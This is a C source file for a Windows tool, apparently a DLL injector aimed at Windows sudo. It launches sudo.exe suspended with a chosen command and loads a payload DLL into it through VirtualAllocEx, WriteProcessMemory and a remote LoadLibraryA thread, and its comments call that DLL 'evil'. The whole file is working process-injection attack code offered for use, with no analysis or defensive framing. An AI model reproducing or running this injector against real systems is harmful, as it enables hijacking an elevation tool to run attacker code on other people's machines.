#include <Windows.h>
#include <psapi.h>
#include <stdio.h>
#include <tlhelp32.h>

static HANDLE inject_dll(HANDLE processHandle, char dllName[]);
static HANDLE spawn_target(char*, char*);
static HANDLE find_sudo_target();
DWORD FindRunningSudo();
char defaultPayload[] = "C:\\sudo-dll-payload.dll";
const char* kSudoFile = "sudo.exe";


/*
Usage: sudo-dll-injector.exe 'cmd to run' <dll to inject>
*/
int main(int argc, char **argv) {
	char* payload;
	if (argc >= 3) {
		payload = argv[2];
	}
	else {
		payload = defaultPayload;
	}

	printf("Going to inject %s into a controlled process to run '%s'\n", payload, argv[1]);

	HANDLE controlled_process = spawn_target(argv[1], payload);
	WaitForSingleObject(controlled_process, INFINITE);
}

static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	if (hKernel32 == NULL) {
		return NULL;
	}
	VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
	if (lb == NULL) {
		printf("Couldn't find LoadLibraryA\n");
		return NULL;
	}

	size_t dllNameLen = strlen(dllName);
	// allocate memory buffer for remote process
	void *rb = VirtualAllocEx(proccessHandle, NULL, dllNameLen + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rb == NULL) {
		return NULL;
	}

	// "copy" evil DLL between processes
	WriteProcessMemory(proccessHandle, rb, dllName, dllNameLen, NULL);

	// our process start new thread
	HANDLE rt = CreateRemoteThread(proccessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	if (rt == NULL) {
		printf("Cannot create remote thread.");
		CloseHandle(proccessHandle);
		return NULL;
	}

	printf("Successfully injected DLL and called LoadLibraryA on it.\n");
	WaitForSingleObject(rt, INFINITE);

	return rt;
}


static HANDLE spawn_target(char *cmd_to_run, char *path_to_payload) {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(si);
	HRESULT createProcessResult = CreateProcessA("C:\\Windows\\System32\\sudo.exe", cmd_to_run, 0, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (createProcessResult == 0) {
		printf("Creating the target failed.\n");
		return FALSE;
	}

	HANDLE remoteThread = inject_dll(pi.hProcess, path_to_payload);
	if (remoteThread == NULL) {
		printf("Injecting payload failed.\n");
		return FALSE;
	}

	// Modify suspended process

	ResumeThread(pi.hThread);
	return pi.hProcess;
}
